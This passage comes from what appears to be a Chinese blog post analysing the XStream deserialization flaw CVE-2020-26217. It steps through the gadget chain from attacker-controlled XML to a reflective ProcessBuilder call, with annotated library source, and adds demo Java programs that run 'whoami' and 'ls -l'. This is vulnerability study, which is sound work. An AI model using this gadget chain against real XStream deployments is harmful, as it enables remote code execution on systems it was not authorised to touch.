<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150621674.png" data-caption="image-20230817150621674"><img src="/../images/Java/deserialization/image-20230817150621674.png" alt="image-20230817150621674"></a></p>
<p>完整利用链（Gadgets）如下</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817154237775.png" data-caption="image-20230817154237775"><img src="/../images/Java/deserialization/image-20230817154237775.png" alt="image-20230817154237775"></a></p>
<p>知道完整调用链，现回到 <code>XStreamExample.java</code> 对 <code>xstream.fromXML()</code> 方法进行 <code>debug</code> ，逐一进行调试分析，通过不断的点点点点，发现调用链实在太长，最终还是通过上面分析出来的 <code>Gadgets</code> 直接直接定位漏洞点</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818191523527.png" data-caption="image-20230818191523527"><img src="/../images/Java/deserialization/image-20230818191523527.png" alt="image-20230818191523527"></a></p>
<p>回到 <code>ProcessBuilder.java</code> 文件下打下断点，重新获取完整的 <code>Gadgets</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818192007754.png" data-caption="image-20230818192007754"><img src="/../images/Java/deserialization/image-20230818192007754.png" alt="image-20230818192007754"></a></p>
<p>然后根据上面分析，我们知道 <code>XStream</code> 在进行序列化前，需要先将值利用 <code>HashMap()</code> 生成 <code>hash</code> 然后 <code>put</code> 到 <code>entry</code> 中，根据 <code>Poc</code> 及 <code>HashMap()</code> 关键字，我们定位到 </p>
<p>调用链 <code>putCurrentEntryIntoMap:107,MapCoverter(com.thoughtworks.xstream.converters.collections)</code> </p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818195409950.png" data-caption="image-20230818195409950"><img src="/../images/Java/deserialization/image-20230818195409950.png" alt="image-20230818195409950"></a></p>
<p>根据调用链向上分析，找到获取 <code>hash</code> 值的代码，调用了 <code>getStringValue()</code> 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818201645103.png" data-caption="image-20230818201645103"><img src="/../images/Java/deserialization/image-20230818201645103.png" alt="image-20230818201645103"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200313210.png" data-caption="image-20230818200313210"><img src="/../images/Java/deserialization/image-20230818200313210.png" alt="image-20230818200313210"></a></p>
<p>跟进 <code>getStringValue()</code> ， <code>Ctrl + 鼠标左键</code>，具体 <code>getStringValue()</code> 方法如下，代码大概意思是通过 <code>instanceof</code> 运算符检查 <code>this.value</code> 这个对象是否为字符串（String）类型，若表达式 <code>this.value instanceof String</code> 为 <code>true</code> 则将 <code>this.value</code> 这个对象强制转换为 <code>String</code> 类型并返回，若不是 <code>String</code> 类型则调用<code>this.value.toString()</code> 将 <code>this.value</code> 转换为字符串并返回</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200807155.png" data-caption="image-20230818200807155"><img src="/../images/Java/deserialization/image-20230818200807155.png" alt="image-20230818200807155"></a></p>
<p>根据调用链去到 <code>getStringValue()</code> , 由下图得知，<code>this.value</code> 的值为 <code>&#123;Base64Date@1473&#125;</code> 其中 Base64@Date 为对象的类名，1473是对象的哈希码</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202004137.png" data-caption="image-20230818202004137"><img src="/../images/Java/deserialization/image-20230818202004137.png" alt="image-20230818202004137"></a></p>
<p>由 Poc 可知，<code>this.value</code> 的值为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类，由于攻击者可通过 <code>xml</code> 控制 <code>NativeString</code> 元素的 <code>value</code> 子元素，构造了攻击，官方构建为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202344501.png" data-caption="image-20230818202344501"><img src="/../images/Java/deserialization/image-20230818202344501.png" alt="image-20230818202344501"></a></p>
<p>当 <code>this.value</code> 为 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 时，程序调用 Base64Data 类的 <code>toString</code> 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202759615.png" data-caption="image-20230818202759615"><img src="/../images/Java/deserialization/image-20230818202759615.png" alt="image-20230818202759615"></a></p>
<p><code> Ctrl + 鼠标左键</code> 跟进<code>toString()</code> 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202847844.png" data-caption="image-20230818202847844"><img src="/../images/Java/deserialization/image-20230818202847844.png" alt="image-20230818202847844"></a></p>
<p>在 InputStream is 上打上断点，然后重新 debug </p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819121943027.png" data-caption="image-20230819121943027"><img src="/../images/Java/deserialization/image-20230819121943027.png" alt="image-20230819121943027"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法返回类型为byte[]，表示该方法将返回一个字节数组</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] get() &#123;</span><br><span class="line">    <span class="comment">// 检查成员变量this.data是否为null</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.data == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个ByteArrayOutputStreamEx对象baos，并指定初始容量为1024字节</span></span><br><span class="line">            <span class="type">ByteArrayOutputStreamEx</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStreamEx</span>(<span class="number">1024</span>);</span><br><span class="line">            <span class="comment">// 从this.dataHandler.getDataSource().getInputStream()获取输入流is</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="built_in">this</span>.dataHandler.getDataSource().getInputStream();</span><br><span class="line">            <span class="comment">// 使用baos.readFrom(is)将输入流的内容读取到baos中</span></span><br><span class="line">            baos.readFrom(is);</span><br><span class="line">            <span class="comment">// 关闭输入流is</span></span><br><span class="line">            is.close();</span><br><span class="line">            <span class="comment">// 将baos.getBuffer()返回的内部字节数组赋值给this.data</span></span><br><span class="line">            <span class="built_in">this</span>.data = baos.getBuffer();</span><br><span class="line">            <span class="comment">// 将baos.size()返回的字节数赋值给this.dataLen</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = baos.size();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="comment">// 在执行上述操作的过程中发生IOException异常，则将this.dataLen设置为0</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<p>代码大意如下，由 Poc 和上图可知，这一程序执行步骤如下：</p>
<p>1、<code>this.dataHandler.getDataSource()</code>  是获取 <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> 类中的 <code>dataHandler</code> 属性的<code>DataSource</code> 值，而   poc 中 DateSource 设置的是 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> 类，所以 	<code>this.dataHandler.getDataSource()</code> 为 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123639794.png" data-caption="image-20230819123639794"><img src="/../images/Java/deserialization/image-20230819123639794.png" alt="image-20230819123639794"></a></p>
<p>2、然后程序继续往下执行，通过 <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> 类的 <code>getInputStream</code> 方法，获取<code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc</code> 的 is 属性值</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123847457.png" data-caption="image-20230819123847457"><img src="/../images/Java/deserialization/image-20230819123847457.png" alt="image-20230819123847457"></a></p>
<p>继续跟踪，我们由上图可知， is 中设置的值为 <code>java.io.SequenceInputStream</code> 类，我们需要跟进该类，调用的是 该类的 <code>nextStream()</code> 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124515348.png" data-caption="image-20230819124515348"><img src="/../images/Java/deserialization/image-20230819124515348.png" alt="image-20230819124515348"></a></p>
<p><code>Ctrl + 鼠标左键</code> 跟进代码 </p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nextStream()方法被声明为final，表示该方法不能被继承类重写。方法没有返回值，使用void表示</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">nextStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 检查成员变量in是否为null,如果in不为null，则调用in.close()关闭当前的输入流</span></span><br><span class="line">    <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 如果迭代器e有下一个元素，则调用e.nextElement()获取下一个元素，并将其强制转换为 InputStream 类型，并将结果赋值给in</span></span><br><span class="line">    <span class="keyword">if</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        in = (InputStream) e.nextElement();</span><br><span class="line">        <span class="comment">// 如果in为null，则抛出NullPointerException异常。</span></span><br><span class="line">        <span class="keyword">if</span> (in == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果迭代器e没有下一个元素，则将in赋值为null</span></span><br><span class="line">    <span class="keyword">else</span> in = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124734273.png" data-caption="image-20230819124734273"><img src="/../images/Java/deserialization/image-20230819124734273.png" alt="image-20230819124734273"></a></p>
<p>由 Poc 可知，is 下的 e 元素的值被设置为 <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125255722.png" data-caption="image-20230819125255722"><img src="/../images/Java/deserialization/image-20230819125255722.png" alt="image-20230819125255722"></a></p>
<p>继续根据调用链跟进  <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code>，其调用了该类的 nextElement() 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125438579.png" data-caption="image-20230819125438579"><img src="/../images/Java/deserialization/image-20230819125438579.png" alt="image-20230819125438579"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回类型为Object，表示该方法将返回一个对象</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">nextElement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="comment">// 当type的值为KEYS时，调用iterator.next()获取迭代器的下一个元素，调用获取到的元素的getKey()方法，返回元素的键</span></span><br><span class="line">        <span class="keyword">case</span> KEYS: <span class="keyword">return</span> iterator.next().getKey();</span><br><span class="line">        <span class="comment">// 当type的值为ELEMENTS时，调用iterator.next()获取迭代器的下一个元素，调用获取到的元素的getValue()方法，返回元素的值</span></span><br><span class="line">        <span class="keyword">case</span> ELEMENTS: <span class="keyword">return</span> iterator.next().getValue();</span><br><span class="line">        <span class="comment">// 如果type的值不是KEYS也不是ELEMENTS，即没有匹配的case，则执行default代码块，返回null</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由 poc 可知，type  值为 KEY，则获取 iterator 下的元素</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130132192.png" data-caption="image-20230819130132192"><img src="/../images/Java/deserialization/image-20230819130132192.png" alt="image-20230819130132192"></a></p>
<p>继续跟进<code> &lt;iterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</code>  中的 <code>javax.imageio.spi.FilterIterator</code> 类，调用的是该类的 advance() 方法</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130431252.png" data-caption="image-20230819130431252"><img src="/../images/Java/deserialization/image-20230819130431252.png" alt="image-20230819130431252"></a></p>
<p><code>Ctrl + 鼠标左键</code> , 跟进代码</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130613686.png" data-caption="image-20230819130613686"><img src="/../images/Java/deserialization/image-20230819130613686.png" alt="image-20230819130613686"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// advance()方法是一个私有方法，没有返回值，使用void表示</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">advance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 在循环中，通过iter.next()获取迭代器的下一个元素，并将其赋值给泛型类型T的变量elt</span></span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">elt</span> <span class="operator">=</span> iter.next();</span><br><span class="line">        <span class="comment">// 如果满足过滤条件，将elt赋值给变量next，表示找到了下一个元素，并使用return语句提前结束方法,如果不满足过滤条件,则继续下一次循环，继续查找下一个满足条件的元素。</span></span><br><span class="line">        <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">            next = elt;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>再次回到 poc 中，将 iterator 展开，查看有哪些元素，其中 ierator 下 filter 是控制过滤条件 </p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142118262.png" data-caption="image-20230819142118262"><img src="/../images/Java/deserialization/image-20230819142118262.png" alt="image-20230819142118262"></a></p>
<p>继续跟进 <code>javax.imageio.ImageIO$ContainsFilter</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142333905.png" data-caption="image-20230819142333905"><img src="/../images/Java/deserialization/image-20230819142333905.png" alt="image-20230819142333905"></a></p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法返回一个布尔值 接受 Object类型的参数 elt，表示要进行过滤的元素</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filter</span><span class="params">(Object elt)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用method.invoke(elt)方法，将elt作为参数，执行反射调用,反射调用返回一个Object类型的结果，需要将其强制转换为String[]类型</span></span><br><span class="line">        <span class="keyword">return</span> contains((String[])method.invoke(elt), name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续展开 poc 下 filter 下的元素，发现来到了触发执行命令的类，所以由于 <code>method.invoke(elt)</code> 可控，所以导致 method 可以通过 xml 中<code>javax.imageio.ImageIO$ContainsFilter</code> 元素包含的 method 元素被控制，method 里面的 <code>&lt;class&gt;</code> 为我们调用的恶意类,由于程序默认没有对其限制所以导致攻击者可利用 <code>java.lang.ProcessBuilder</code> 构造命令执行</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143335818.png" data-caption="image-20230819143335818"><img src="/../images/Java/deserialization/image-20230819143335818.png" alt="image-20230819143335818"></a></p>
<p>最后 <code>method.invoke(elt)</code> 执行命令，其中 elt 为构造好的 java.lang.ProcessBuilder 对象。所以在 method 与 elt 都可控的情况下，进行反射调用即可实现远程代码执行利用</p>
<p><em>注释：Java反射机制是指在运行时动态地获取和操作类的信息，包括类的属性、方法、构造函数等。通过反射，可以在程序运行时检查类的结构，创建对象，调用方法，访问和修改字段，甚至可以动态地生成新的类</em></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819152832987.png" data-caption="image-20230819152832987"><img src="/../images/Java/deserialization/image-20230819152832987.png" alt="image-20230819152832987"></a></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143916112.png" data-caption="image-20230819143916112"><img src="/../images/Java/deserialization/image-20230819143916112.png" alt="image-20230819143916112"></a></p>
<p>最后回到了最初的 debug 起点，执行命令。</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819143204447.png" data-caption="image-20230819143204447"><img src="/../images/Java/deserialization/image-20230819143204447.png" alt="image-20230819143204447"></a> </p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>通过对以上案例的分析，整个过程调试下来个人还是学到了不少，主要还是思路方面，对于整体调试思路有所帮助。总体上对于个人来说,在分析过程中无论是对 Java 基础的语法、代码的含义以及开发工具的运用等等均需要有点积累才能更好地开展分析调试工作。</p>
<h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="常见能能执行命令的-java-类"><a href="#常见能能执行命令的-java-类" class="headerlink" title="常见能能执行命令的 java 类"></a>常见能能执行命令的 java 类</h3><ul>
<li><p><code>java.lang.Runtime</code>：<code>Runtime</code>类提供了执行系统命令的方法，如<code>exec()</code>和<code>getRuntime()</code>。</p>
</li>
<li><p>java.lang.ProcessBuilder<code>：</code>ProcessBuilder&#96;类用于创建进程，并执行系统命令。它提供了更灵活的方式来执行命令，并可以设置环境变量、工作目录等。</p>
</li>
<li><p><code>java.lang.Process</code>：<code>Process</code>类表示正在运行的进程。可以使用<code>Process</code>类的方法来获取进程的输入流、输出流和错误流，以及等待进程完成并获取执行结果。</p>
</li>
<li><p><code>java.lang.ProcessImpl</code>：这是<code>Process</code>类的实现类，它是Java对底层操作系统进程的封装。</p>
</li>
</ul>
<p>使用 <code>Runtime</code> 类执行系统命令的示例：</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemCommandExecution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>; <span class="comment">// 替换为你要执行的系统命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行的输出结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;命令执行完成，退出码：&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>使用 <code>ProcessBuilder</code> 类执行系统命令的示例：</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行系统命令</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>&#125;; <span class="comment">// 替换为你要执行的系统命令及参数</span></span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(command);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;命令执行完成，退出码：&quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/v1ntlyn/p/14034019.html</span><br><span class="line">https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</span><br><span class="line">http://x-stream.github.io/converters.html</span><br><span class="line">https://x-stream.github.io/CVE-2020-26217.html</span><br><span class="line">https://mp.weixin.qq.com/s/0kWEaeZipT45BGyCu05z5A</span><br><span class="line">https://xz.aliyun.com/t/8694</span><br></pre></td></tr></table></figure></div>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">二、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.1.</span> <span class="toc-text">Java 序列化与反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-x2F-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">序列化&#x2F;反序列化方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97"><span class="toc-number">2.2.2.</span> <span class="toc-text">反序列</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">XStream反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-26217"><span class="toc-number">3.1.1.</span> <span class="toc-text">CVE-2020-26217</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a 